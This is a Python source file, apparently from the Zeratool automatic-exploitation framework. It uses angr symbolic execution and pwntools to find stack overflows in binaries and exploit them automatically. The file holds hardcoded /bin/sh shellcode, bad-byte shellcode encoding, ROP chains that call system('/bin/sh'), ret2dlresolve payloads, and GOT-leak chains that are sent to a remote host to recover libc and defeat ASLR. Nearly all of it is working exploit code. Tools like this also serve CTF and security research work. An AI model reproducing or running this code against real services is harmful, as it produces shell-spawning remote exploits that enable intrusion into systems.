import claripy
from .radare_helper import findShellcode
from .remote_libc import get_remote_libc_with_leaks
import angr
from pwn import *
import logging

logging.getLogger("pwnlib.elf.elf").disabled = True

log = logging.getLogger(__name__)

is_printable = False


def constrainToAddress(state, sym_val, addr, endian="little"):

    bits = state.arch.bits
    padded_addr = 0

    if bits == 32:
        padded_addr = p32(addr, endian=endian)
    elif bits == 64:
        botAddr = addr & 0xFFFFFFFF
        topAddr = (addr >> 32) & 0xFFFFFFFF
        padded_addr = p32(topAddr, endian=endian) + p32(botAddr, endian=endian)

    constraints = []
    for i in range(bits / 8):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        if state.se.satisfiable(extra_constraints=[constraint]):
            constraints.append(constraint)

    return constraints


def getShellcode(properties):
    context.arch = properties["protections"]["arch"]
    context.bits = 32

    if context.arch == "i386":  # /bin/sh shellcode - 23 bytes
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
    elif context.arch == "amd64":  # /bin/sh shellcode - 23 bytes
        context.bits = 64
        shellcode = (
            b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
            + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        )
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def get_leak_rop_chain(properties, leak_num=-1):
    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    print_functions = ["puts", "printf"]
    leak_function = list(elf.got)[leak_num]
    log.debug("elf.got : {}".format(elf.got))
    log.debug("Leaking {}".format(leak_function))

    ret_func = None

    # Find the function we want to call
    # Just puts for right now
    for function in print_functions:
        log.debug(function)
        log.debug(elf.plt)
        if function in elf.plt:
            ret_func = elf.plt[function]
            break
        elif function in elf.symbols:
            ret_func = elf.symbols[function]
            break
    if ret_func is None:
        raise RuntimeError("Cannot find symbol to return to")

    # chain is even number, so need to align for movabs
    if not properties["sp_is_16bit_aligned"]:
        log.info("sp is aligned 16bit")
        rop.raw(rop.ret.address)

    rop.call(ret_func, [elf.got[leak_function]])

    retrigger_addr = properties.get("vulnerable_function", None)

    if retrigger_addr:  # Retrigger exploit
        rop.call(retrigger_addr.rebased_addr)
    elif "main" in elf.symbols:
        rop.call(elf.symbols["main"])
    else:
        log.error("No main symbol exposed, can't auto call")

    log.info("\n{}".format(rop.dump()))

    return rop, rop.build()


def choose_data_addr(elf, symbol):
    # Try to find an offset that works with the version addr
    # The offset for the ElfSym (size 0x10) from .DynSym needs to be in a writable section
    # and the offset from DT_VERSYM (size 2) needs to point to a half-word that isn't too large
    # Otherwise we will get a segfault
    # We can't go beyond mapped memory of libc which l_info is close to, the value we read
    # will get multiplied by 0x10 and added to the base of l_versions so it needs to be less than
    # and an upper limit i've seen is ~0x600, so we would need bytes less than 0x60

    elf_load_address_fixup = elf.address - elf.load_addr
    symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + elf_load_address_fixup
    versym = elf.dynamic_value_by_tag("DT_VERSYM") + elf_load_address_fixup
    bss = elf.get_section_by_name(".bss").header.sh_addr + elf_load_address_fixup
    start_search_addr = bss + len(symbol + b"\x00")
    # End at the end of the page
    end_search_addr = (bss + 0x1000) & ~0xFFF
    recommend_addr = start_search_addr
    for a in range(start_search_addr, end_search_addr, 2):
        index = align(0x10, a - symtab) // 0x10
        version_addr = versym + (2 * index)
        # Get bytes
        b = elf.read(version_addr, 2)
        val = int.from_bytes(b, "little")
        if val < 0x60:
            recommend_addr = a
            break
    return recommend_addr


def get_dlresolve_rop_chain(properties, state, data_addr=None):

    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    log.info("Trying dlresolve chain")

    context.arch = "amd64"
    dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

    # data_addr = choose_data_addr(elf, b"system")

    # log.info("{} : {}".format(hex(data_addr), hex(dlresolve.data_addr)))

    if data_addr:
        dlresolve.data_addr = data_addr

    if "read" in elf.plt:
        rop.call("read", [0, dlresolve.data_addr])
    elif "gets" in elf.plt:
        rop.call("gets", [dlresolve.data_addr])
    # rop.read(0, dlresolve.data_addr)
    # rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

    rop.ret2dlresolve(dlresolve)

    log.info("rop chain gadgets and values:\n{}".format(rop.dump()))

    """
    We need both the generated chain and gadget addresses for when
    we contrain theprogram state to execute and constrain this chain,
    so we pass back both the rop tools refernce along with the chain.
    """
    return dlresolve, rop, rop.build()


def get_rop_chain(properties, state=None):
    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
    functions = ["execve", "system"]

    ret_func = None
    ret_string = None

    if properties.get("force_dlresolve", False):
        log.info("Forcing dlresolve chain")
        return get_dlresolve_rop_chain(properties, state)

    # Find the function we want to call
    for function in functions:
        if function in elf.plt:
            ret_func = elf.plt[function]
            break
        elif function in elf.symbols:
            ret_func = elf.symbols[function]
            break

    # Find the string we want to pass it
    for string in strings:
        str_occurences = list(elf.search(string))
        if str_occurences:
            ret_string = str_occurences[0]
            break

    # If we can't find our symbols and string in the binary
    # we may need to check our libc bin
    if properties.get("libc", None):

        log.info("[~] Provided libc, using leak and lib to build chain")

        if isinstance(properties["libc"], dict):
            log.info("Trying remote libc offsets")
            remote_libc = properties["libc"]["remote_libc"][0]

            symbols = remote_libc["symbols"]
            ret_func = int(symbols["system"], 16) + properties["libc_base_address"]
            ret_string = (
                int(symbols["str_bin_sh"], 16) + properties["libc_base_address"]
            )
        else:
            libc = ELF(properties["libc"])
            # Set libc loaded address
            libc.address = properties["libc_base_address"]

            # Find the function we want to call
            for function in functions:
                if function in libc.plt:
                    ret_func = libc.plt[function]
                    break
                elif function in libc.symbols:
                    ret_func = libc.symbols[function]
                    break

            # Find the string we want to pass it
            for string in strings:
                str_occurences = list(libc.search(string))
                if str_occurences:
                    ret_string = str_occurences[0]
                    break
            rop = ROP(libc)

    if not ret_func:
        log.warning("Cannot find symbol to return to")
        return get_dlresolve_rop_chain(properties, state)
    if not ret_string:
        log.warning("Cannot find string to pass to system or exec call")
        return get_dlresolve_rop_chain(properties, state)

    # chain is odd number, so need to align for movabs
    if properties["sp_is_16bit_aligned"]:
        log.info("sp is aligned 16bit")
        rop.raw(rop.ret.address)

    if properties.get("libc", None):
        rop.call(ret_func, [ret_string])
        # rop.call(ret_func, [ret_string, 0, 0])
    else:
        # If we don't have libc we probably don't have all the nice
        # gadgets
        rop.call(ret_func, [ret_string])

    log.info("\n{}".format(rop.dump()))

    return None, rop, rop.build()


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    """
    # get all the symbolic bytes from stdin
    user_input = state.globals["user_input"]

    sym_addrs = []
    sym_addrs.extend(state.memory.addrs_for_name(next(iter(user_input.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def check_continuity(address, addresses, length):
    """
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    """

    for i in range(length):
        if not address + i in addresses:
            return False

    return True


def overflow_detect_filter(simgr):

    for state in simgr.active:
        if state.globals.get("type", None) == "overflow_variable":
            log.info("Found vulnerable state. Overflow variable to win")
            user_input = state.globals["user_input"]
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            log.info("[+] Vulnerable path found {}".format(input_bytes))
            state.globals["type"] = "overflow_variable"
            state.globals["input"] = input_bytes
            simgr.stashes["found"].append(state)
            simgr.stashes["active"].remove(state)
            return simgr

    for state in simgr.unconstrained:
        bits = state.arch.bits
        num_count = bits / 8
        pc_value = b"C" * int(num_count)

        # Check satisfiability
        if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

            state.add_constraints(state.regs.pc == pc_value)
            user_input = state.globals["user_input"]

            log.info("Found vulnerable state.")

            if is_printable:
                log.info("Constraining input to be printable")
                for c in user_input.chop(8):
                    constraint = claripy.And(c > 0x2F, c < 0x7F)
                    if state.solver.satisfiable([constraint]):
                        state.add_constraints(constraint)

            # Get input values
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            log.info("[+] Vulnerable path found {}".format(input_bytes))
            if b"CCCC" in input_bytes:
                log.info("[+] Offset to bytes : {}".format(input_bytes.index(b"CCCC")))
            state.globals["type"] = "Overflow"
            state.globals["input"] = input_bytes
            simgr.stashes["found"].append(state)
            simgr.stashes["unconstrained"].remove(state)
            break

    return simgr


def point_to_win_filter(simgr):

    for state in simgr.unconstrained:
        properties = state.globals["properties"]

        for func in properties["win_functions"]:
            address = properties["win_functions"][func]["fcn_addr"]

            log.info("Trying {}".format(hex(address)))

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[state.regs.pc == address]):
                state.add_constraints(state.regs.pc == address)
                user_input = state.globals["user_input"]

                if is_printable:
                    log.info("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(user_input, cast_to=bytes)
                log.info("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                simgr.stashes["unconstrained"].remove(state)
            return simgr

    return simgr


def point_to_shellcode_filter(simgr):
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        shellcode = getShellcode(properties)
        using_run_time_leak = False

        # Find potential addresses for shellcode
        addresses = [x for x in find_symbolic_buffer(state, len(shellcode))]
        if len(addresses):
            list.sort(addresses)

        # Build shellcode and check for bad chars
        avoidList = []
        for i, address in enumerate(addresses):
            my_buf = state.memory.load(address, len(shellcode))
            if not state.satisfiable(extra_constraints=([my_buf == shellcode])):
                log.info("[~] Shellcode can't be placed. Checking for bad bytes.")
                for i in range(len(shellcode)):
                    curr_byte = state.memory.load(address + i, 1)
                    if state.satisfiable(
                        extra_constraints=([curr_byte == shellcode[i]])
                    ):
                        pass
                        # log.info("[+] Byte {} Can be {}".format(i,repr(shellcode[i])))
                    else:
                        log.info(
                            "[-] Address {} Byte {} Can't be {}".format(
                                hex(address + i), i, repr(shellcode[i])
                            )
                        )
                        avoidList.append(shellcode[i])
                log.info("Avoiding : {}".format(avoidList))
                log.info("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))
                try:
                    shellcode = encoders.encode(shellcode, avoidList)
                    log.info(
                        "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
                    )
                except PwnlibException:
                    log.info(
                        "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                    )
                except TypeError:
                    raise RuntimeError(
                        "Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte"
                    )
                break

        # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
        log.info("Trying addresses : {}".format(addresses))
        # Iterate over addresses looking for a winner
        for address in addresses:
            log.info("Trying address {}".format(hex(address)))

            # Setup shellcode
            memory = state.memory.load(address, len(shellcode))
            shellcode_bvv = state.solver.BVV(shellcode)

            if "leaked_type" in state.globals:
                log.info("We have a leak, let's try and use that")

                # Either this is a call during a real run or
                # we're still detecting
                if "run_leak" in properties["pwn_type"]:
                    address = properties["pwn_type"]["run_leak"]
                    # Trust that this leak points to something good
                    using_run_time_leak = True

            constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == address)

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[constraint]):
                log.info("[+] Win")
                state.add_constraints(constraint)

                user_input = state.globals["user_input"]

                if is_printable:
                    log.info("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(
                    user_input, cast_to=bytes, extra_constraints=[constraint]
                )

                log.info("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                return simgr

    return simgr


def do_leak_with_ropchain_constrain(
    elf, rop_chain, new_state, is_32bit=False, dlresolve=None
):
    """
    This is a more traditional build and constrain payload that looks for
    an offset from the initial input and starts placing a rop chain there.

    This method is a pain in the butt to debug, so I'd encourage doing the
    leak with stepping so we know when a gaget breaks, but if the other one
    is breaking, you can try this one.
    """
    log.debug("Constraining input to rop chain without single stepping")
    user_input = new_state.globals["user_input"]

    if is_32bit:
        rop_chain_bytes = [x if isinstance(x, int) else u32(x) for x in rop_chain]
        rop_chain_bytes = b"".join([p32(x) for x in rop_chain_bytes])
        pc_index = 3
    else:
        rop_chain_bytes = [x if isinstance(x, int) else u64(x) for x in rop_chain]
        rop_chain_bytes = b"".join([p64(x) for x in rop_chain_bytes])
        pc_index = 7

    bytes_iter = 0
    offset = 0
    start_constraining = False
    for i, x in enumerate(user_input.chop(8)):

        # Hunt for the start of PC overwrite
        if x is new_state.regs.pc.chop(8)[pc_index]:
            log.debug("Found PC overwrite at offset : {}".format(i))
            start_constraining = True

        # Assume gadgets are all next to each other on the stack
        # and place them right after each other.
        if start_constraining and bytes_iter < len(rop_chain_bytes):
            if new_state.satisfiable(
                extra_constraints=[x == rop_chain_bytes[bytes_iter]]
            ):
                new_state.add_constraints(x == rop_chain_bytes[bytes_iter])
                bytes_iter += 1
            else:
                log.error(
                    "Not satifiable {} -> {}".format(x, rop_chain_bytes[bytes_iter])
                )
                break

    if not dlresolve:

        rop_simgr = new_state.project.factory.simgr(new_state)

        retrigger_addr = new_state.globals.get("vulnerable_function", None)

        if retrigger_addr:  # Retrigger exploit
            retrigger_addr = retrigger_addr.rebased_addr
        elif "main" in elf.symbols:
            retrigger_addr = elf.symbols["main"]

        # Verify that these gadgets result in a call to main after the leak
        if new_state.globals["needs_leak"]:
            rop_simgr.explore(find=lambda s: retrigger_addr == s.solver.eval(s.regs.pc))
            if len(rop_simgr.found) > 0:
                new_state = rop_simgr.found[0]
            else:
                log.debug("Couldn't verify")

        log.debug(rop_simgr)

    return user_input, new_state


def plt_call_hook(state, gadget_addr):
    """
    Emulating the following instructions:
    push    qword ptr [rip + 0x2fe2]
    bnd jmp    qword ptr [rip + 0x2fe3]
    """
    log.info("Emulating plt call hook")
    p2 = angr.Project(state.project.filename, auto_load_libs=False)
    CFG = p2.analyses.CFG()

    pc_block = CFG.model.get_any_node(gadget_addr).block
    for insn in pc_block.capstone.insns:
        log.info(insn)
        rip_addr = insn.address
        rip_offset = insn.disp
        if insn.mnemonic == "push":
            ret_val = rip_addr + rip_offset + insn.size
            log.info("Emulating stack push with value : {}".format(hex(ret_val)))
            state.stack_push(ret_val)
        elif "jmp" in insn.mnemonic:
            pc_val = rip_addr + rip_offset + insn.size
            log.info("Emulating plt jmp with value : {}".format(hex(pc_val)))
            # Emulating a 'bnd jmp'
            # the bnd part is pretty much just a nop
            state.regs.pc = pc_val


def get_debug_stack(state, depth=8, rop=None):
    register_size = int(state.arch.bits / 8)
    curr_sp = state.solver.eval(state.regs.sp)

    dbg_lines = ["Current Stack Pointer : {}".format(hex(curr_sp))]

    curr_sp -= depth * register_size

    for i in range(depth + 4):
        address = curr_sp + (i * register_size)
        val = state.memory.load(address, register_size)
        concrete_vaue = 0
        desc = ""
        concrete_vaue = state.solver.eval(val, cast_to=bytes)
        concrete_vaue = u64(concrete_vaue)
        desc = state.project.loader.describe_addr(concrete_vaue)
        if rop and concrete_vaue in rop.gadgets:
            rop_gadget = rop.gadgets[concrete_vaue]
            desc += "\n\t"
            desc += "\n\t".join(rop_gadget.insns)
        if "not part of a loaded object" in desc:
            desc = ""
        dbg_line = "{:18} | {:18} - {}".format(hex(address), hex(concrete_vaue), desc)
        dbg_lines.append(dbg_line)

    return "\n".join(dbg_lines)


def fix_gadget_registers(gadget):
    if gadget.regs != []:
        return gadget
    log.debug("Fixing gadget : {}".format(gadget))
    for insn in gadget.insns:
        if "pop" in insn:
            # Splt a 'pop eax' or 'pop rdx' to get register name
            gadget.regs.append(insn.split(" ")[-1])
    return gadget


def do_64bit_leak_with_stepping(elf, rop, rop_chain, new_state, dlresolve=None):
    # Only amd64 right now
    user_input = new_state.globals["user_input"]
    curr_rop = None
    elf_symbol_addrs = [y for x, y in elf.symbols.items()]
    p = new_state.project

    for i, gadget in enumerate(rop_chain):

        if gadget in rop.gadgets:
            curr_rop = rop.gadgets[gadget]

            curr_rop = fix_gadget_registers(curr_rop)

            # reversing it lets us pop values out easy
            curr_rop.regs.reverse()

        # Case of if we're executing
        if curr_rop is None or gadget in rop.gadgets or len(curr_rop.regs) == 0:

            if new_state.satisfiable(extra_constraints=([new_state.regs.pc == gadget])):
                """
                For the actual ROP gadgets, we're stepping through them
                until we hit an unconstrained value - We did a `ret` back
                onto the symbolic stack.
                This process is slower than just setting the whole stack
                to the chain, but in testing it seems to work more reliably
                """
                log.info("Setting PC to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.pc == gadget)

                if gadget in elf_symbol_addrs:
                    log.info(
                        "gadget is hooked symbol, contraining to real address, but calling SimProc"
                    )
                    symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]
                    new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr

                # There is no point in letting our last gadget run, we have all
                # the constraints on our input to trigger the leak
                if i == len(rop_chain) - 1:
                    break

                # Are we in the .plt about to execute our dlresolv payload?
                if (
                    p.loader.find_section_containing(gadget).name == ".plt"
                    and dlresolve is not None
                ):
                    """
                    We're expecting a:
                    push qword [0x004040008] # .plt section
                    jmp qword [0x00404010] # .plt section + 0x8
                    or
                    401020  push    qword ptr [0x404008]
                    401026  bnd jmp qword ptr [0x404010]
                    which we can emulate
                    """
                    # load the memory region and constrain it
                    # We already called read that returned a symbolic read value
                    # into the section we're about to use

                    dlresolv_payload_memory = new_state.memory.load(
                        dlresolve.data_addr, len(dlresolve.payload)
                    )
                    if new_state.satisfiable(
                        extra_constraints=(
                            [dlresolv_payload_memory == dlresolve.payload]
                        )
                    ):
                        new_state.add_constraints(
                            dlresolv_payload_memory == dlresolve.payload
                        )
                        log.debug(
                            "Values written to address at : {}".format(
                                hex(dlresolve.data_addr)
                            )
                        )
                    else:
                        log.info(
                            "Could not set dlresolve payload to address : {}".format(
                                hex(dlresolve.data_addr)
                            )
                        )
                        return None, None

                    dlresolv_index = new_state.memory.load(new_state.regs.sp, 8)

                    dlresolve_bytes = p64(rop_chain[i + 1])
                    if new_state.satisfiable(
                        extra_constraints=([dlresolv_index == dlresolve_bytes])
                    ):
                        new_state.add_constraints(dlresolv_index == dlresolve_bytes)
                        log.debug(
                            "Set dlresolv index value to : {}".format(
                                hex(rop_chain[i + 1])
                            )
                        )

                    plt_call_hook(new_state, gadget)

                    rop_simgr = new_state.project.factory.simgr(new_state)

                    # We just need one step into our payload
                    rop_simgr.step()

                    stack_vals = get_debug_stack(new_state, depth=9, rop=rop)
                    log.info(stack_vals)

                    if len(rop_simgr.errored):
                        log.error("Bad Address : {}".format(hex(dlresolve.data_addr)))
                        return None, None

                    new_state = rop_simgr.active[0]
                    new_state.globals["dlresolve_payload"] = dlresolve.payload
                    log.info("Found address : {}".format(hex(dlresolve.data_addr)))
                    log.info(rop_simgr)
                    break

                """
                Since we're stepping through a ROP chain, VEX IR wants to
                try and lift the whole block and emulate a whole block step
                this will break what we're trying to do, so we need to
                tell it to try and emulate single-step execution as closely
                as we can with the opt_level=0    
                """
                rop_simgr = new_state.project.factory.simgr(new_state)
                rop_simgr.explore(opt_level=0)
                new_state = rop_simgr.unconstrained[0]

                # We already set the dlresolv index value, don't try to execute
                # the next piece
                if (
                    p.loader.find_section_containing(gadget).name == ".plt"
                    and dlresolve is not None
                ):
                    break

            else:
                log.error("unsatisfied on {}".format(hex(gadget)))
                break

        # Case for setting registers
        else:
            """
            Usually for 64bit rop chains, we're passing values into
            the argument registers like RDI, so this only covers RDI
            since the auto-rop chain is pretty simple, but we would
            extend this portion to cover all register sets from POP
            calls
            """
            next_reg = curr_rop.regs.pop()
            log.debug("Setting register : {}".format(next_reg))

            gadget_msg = gadget
            if isinstance(gadget, bytes):
                if new_state.arch.bits == 64:
                    gadget = u64(gadget)
                else:
                    gadget = u32(gadget)
            if isinstance(gadget, int):
                gadget_msg = hex(gadget)

            state_reg = getattr(new_state.regs, next_reg)
            if state_reg.symbolic and new_state.satisfiable(
                extra_constraints=([state_reg == gadget])
            ):

                log.info("Setting {} to {}".format(next_reg, gadget_msg))

                new_state.add_constraints(state_reg == gadget)
            else:
                log.error("unsatisfied on {} -> {}".format(next_reg, gadget_msg))
                break

            if len(curr_rop.regs) == 0:
                curr_rop = None
    return user_input, new_state


def leak_remote_libc_functions(simgr):

    """
    We have two main stages when we need a leak,
    the leak stage, which will be the first part of our chain
    and the pwn stage, where we use the leak to set our PC
    to some address relative to the leaked address
    """
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        elf = ELF(properties["file"])

        symbols = {"symbols": {}}

        skip_entries = [
            "__libc_start_main",
            "__gmon_start__",
            "stdout",
            "stdin",
            "stderr",
        ]

        log.info("Current sp : {}".format(hex(state.solver.eval(state.regs.sp))))
        sp_is_16bit_aligned = state.solver.eval(state.regs.sp) & 0xF == 0
        properties["sp_is_16bit_aligned"] = sp_is_16bit_aligned

        leaked_values = {}

        for i, name in enumerate(elf.got):  # leak it all
            if name in skip_entries:
                continue
            log.debug("Leaking {} ".format(name))

            properties["vulnerable_function"] = get_vulnerable_function(state)

            rop, rop_chain = get_leak_rop_chain(properties, leak_num=i)

            new_state = state.copy()
            new_state.globals["vulnerable_function"] = properties["vulnerable_function"]

            # user_input, new_state = do_64bit_leak_with_stepping(
            #     elf, rop, rop_chain, new_state
            # )

            """
            If step-by-step emulation and constraining doesn't work
            another option is to build the entire chain here and load
            the memory starting at the start of chain and add a constraint
            setting it to our rop chain's bytes
            """
            is_32bit = new_state.project.arch.bits == 32

            user_input, new_state = do_leak_with_ropchain_constrain(
                elf, rop_chain, new_state, is_32bit=is_32bit
            )

            input_bytes = new_state.posix.dumps(0)
            output_bytes = new_state.posix.dumps(1)

            r = remote(properties["remote"]["url"], properties["remote"]["port"])
            r.recv()
            r.clean()
            r.sendline(input_bytes)
            bytes_with_leak = r.recvuntil(b"\n").replace(b"\n", b"")
            log.info(bytes_with_leak)
            if is_32bit:
                bytes_with_leak = bytes_with_leak[:4]
                bytes_with_leak = bytes_with_leak.ljust(4, b"\x00")
                leaked_val = u32(bytes_with_leak)
            else:
                bytes_with_leak = bytes_with_leak.ljust(8, b"\x00")
                leaked_val = u64(bytes_with_leak)
            log.info("leaked {} : {}".format(name, hex(leaked_val)))
            r.close()

            leaked_values[name] = leaked_val

            if leaked_val > 0x7F0000000000:
                symbols["symbols"][name] = hex(
                    leaked_val & 0xFFF
                )  # Only want last three for remote leak
            else:
                log.debug("bad canidate address")

        logging.info("leaked all symbols, querying remote libc database")

        for x, y in leaked_values.items():
            log.info("{} : {}".format(x, hex(y)))

        for x, y in symbols["symbols"].items():
            log.info("{} : {}".format(x, y))

        if is_32bit:
            log.warn("remote libc database doesn't support 32bit leaking yet :(")
            log.warn(
                "Try plugging these values into https://libc.nullbyte.cat/ and downloading the libc"
            )
            log.warn("Then rerun Zeratool with --libc flag")
            state.globals["libc"] = None
        else:
            state.globals["libc"] = get_remote_libc_with_leaks(symbols)
        simgr.drop(stash="unconstrained")
        simgr.drop(stash="active")
        simgr.stashes["found"].append(state)

    return simgr


def get_vulnerable_function(state):

    # Python3 magic to get last bbl_addr
    *_, last_block = state.history.bbl_addrs
    symbol_addr = None

    if not state.project.loader.main_object.contains_addr(last_block):
        return symbol_addr

    symbols_addrs = [x.rebased_addr for x in state.project.loader.main_object.symbols]
    symbols_addrs.sort()

    for i, addr in enumerate(symbols_addrs):
        if i == 0:
            continue
        if last_block < addr and last_block > symbols_addrs[i - 1]:
            symbol_addr = symbols_addrs[i - 1]
            symbol = state.project.loader.find_symbol(symbol_addr)
            log.info("Vulnerable function is : {}".format(symbol))
            break

    return symbol


def point_to_ropchain_filter(simgr):

    dlresolve = None
    """
    For angr hooked function that are part of our rop chain,
    like `puts`, we need to force the simulation manager to
    execute through a regular step, without running through
    the hook.
    """
    for state in simgr.active:
        if not state.globals["needs_leak"]:
            properties = state.globals["properties"]
            elf = ELF(properties["file"])
            elf_symbol_addrs = [y for x, y in elf.symbols.items()]
            elf_items = elf.symbols.items()

            pc = state.solver.eval(state.regs.pc)
            if pc in elf_symbol_addrs:
                symbol = [x for x in elf_items if pc == x[1]][0]
                log.debug("hooking : {}".format(symbol))
                state.regs.pc = state.project.loader.find_symbol(symbol[0]).rebased_addr

    """
    We have two main stages when we need a leak,
    the leak stage, which will be the first part of our chain
    and the pwn stage, where we use the leak to set our PC
    to some address relative to the leaked address
    """
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        elf = ELF(properties["file"])

        log.info("Current sp : {}".format(hex(state.solver.eval(state.regs.sp))))
        sp_is_16bit_aligned = state.solver.eval(state.regs.sp) & 0xF == 0
        properties["sp_is_16bit_aligned"] = sp_is_16bit_aligned

        if properties.get("force_dlresolve", False):
            dlresolve, rop, rop_chain = get_rop_chain(properties, state=state)

        elif state.globals["needs_leak"]:
            properties["vulnerable_function"] = get_vulnerable_function(state)
            state.globals["vulnerable_function"] = properties["vulnerable_function"]
            rop, rop_chain = get_leak_rop_chain(properties)
        else:
            dlresolve, rop, rop_chain = get_rop_chain(properties, state=state)

        new_state = state.copy()

        if new_state.project.arch.bits == 32:
            user_input, new_state = do_leak_with_ropchain_constrain(
                elf, rop_chain, new_state, is_32bit=True
            )

        else:
            if dlresolve:

                user_input, new_state = do_64bit_leak_with_stepping(
                    elf, rop, rop_chain, new_state, dlresolve=dlresolve
                )
                if new_state == None:
                    log.info("64bit stepping failed, trying to constrain whole payload")
                    new_state = state.copy()
                    user_input, new_state = do_leak_with_ropchain_constrain(
                        elf, rop_chain, new_state, is_32bit=False, dlresolve=dlresolve
                    )
                new_state.globals["dlresolve_payload"] = dlresolve.payload

                input_buf = new_state.posix.dumps(0)

                if dlresolve.payload in input_buf:
                    payload_index = input_buf.index(dlresolve.payload)

                    """
                    ret2dlresolve happens in two parts:
                        The read rop which pulls in our payload
                        Then sending the payload to be read
                    """
                    new_state.globals["dlresolve_first"] = input_buf[:payload_index]
                    new_state.globals["dlresolve_second"] = input_buf[
                        payload_index : payload_index + len(dlresolve.payload)
                    ]
                else:
                    new_state.globals["dlresolve_first"] = input_buf
                    new_state.globals["dlresolve_second"] = new_state.globals[
                        "dlresolve_payload"
                    ]

                new_state.globals["needs_leak"] = False

                new_state.globals["type"] = "dlresolve"

                simgr.drop(stash="unconstrained")
                simgr.drop(stash="found")
                simgr.stashes["found"].append(new_state)

                log.info("[+] Vulnerable path found {}".format(input_buf))
                log.info(
                    "ret2dlresolve 1st : {}".format(
                        new_state.globals["dlresolve_first"]
                    )
                )
                log.info(
                    "ret2dlresolve 2nd : {}".format(
                        new_state.globals["dlresolve_second"]
                    )
                )
                break
            else:
                """
                If step-by-step emulation and constraining doesn't work
                another option is to build the entire chain here and load
                the memory starting at the start of chain and add a constraint
                setting it to our rop chain's bytes
                """

                user_input, new_state = do_leak_with_ropchain_constrain(
                    elf, rop_chain, new_state, is_32bit=False
                )

        user_input = new_state.globals["user_input"]

        """
        If we're running with a leak stage, we call it done once we hit our leak,
        since we'll want the actual program runtime leak in our next set of
        constraints.
        """
        if new_state.globals["needs_leak"]:
            new_state.globals["needs_leak"] = False

            simgr.drop(stash="unconstrained")
            simgr.drop(stash="found")
            simgr.stashes["found"].append(new_state)

            new_state.globals["leak_input"] = get_trimmed_input(user_input, new_state)
            new_state.globals["type"] = "leak"

            break

        """
        At this point we're running alongside the actual program and trimming won't
        help our input buffer size, so we just get the raw STDIN and use that for 
        input values
        """
        input_bytes = new_state.posix.dumps(0)
        leak_input = new_state.globals["leak_input"]
        # The +1 here is to account for a newline. The get_trimmed_input function
        # isn't adding the newline character
        if not leak_input.endswith(b"\n"):
            pwn_bytes = input_bytes[len(leak_input) + 1 :]
        else:
            pwn_bytes = input_bytes[len(leak_input) :]

        """
        If Zeratool fails, we atleast want the inputs that trigger the leak an 
        attempted pwn for putting into our own manual exploits
        """
        log.info("[+] Vulnerable path found {}".format(input_bytes))
        log.info("Will leak {} before pwn".format(new_state.globals["leaked_func"]))
        log.info("Leak input : {}".format(leak_input))
        log.info("pwn input : {}".format(pwn_bytes))

        new_state.globals["type"] = "Overflow"
        new_state.globals["input"] = pwn_bytes
        simgr.drop(stash="unconstrained")
        simgr.drop(stash="active")
        simgr.stashes["found"].append(new_state)
        break

    return simgr


def get_trimmed_input(user_input, state):
    trim_index = -1
    index = 0
    for c in user_input.chop(8):
        num_constraints = get_num_constraints(c, state)
        if num_constraints == 0 and trim_index == -1:
            trim_index = index
        else:
            trim_index == -1
        index += 1

    input_bytes = state.solver.eval(user_input, cast_to=bytes)

    if trim_index > 0:
        log.debug("Found input without constraints starting at {}".format(trim_index))
        return input_bytes[:trim_index]

    return input_bytes


def get_num_constraints(chop_byte, state):
    constraints = state.solver.constraints
    i = 0
    # Do any constraints mention this BV?
    for constraint in constraints:
        if any(
            chop_byte.structurally_match(x) for x in constraint.recursive_children_asts
        ):
            i += 1
    # log.info("{} : {} : {}".format(chop_byte,i,state.solver.eval(chop_byte,cast_to=bytes)))
    return i


class hook_win(angr.SimProcedure):
    IS_FUNCTION = True

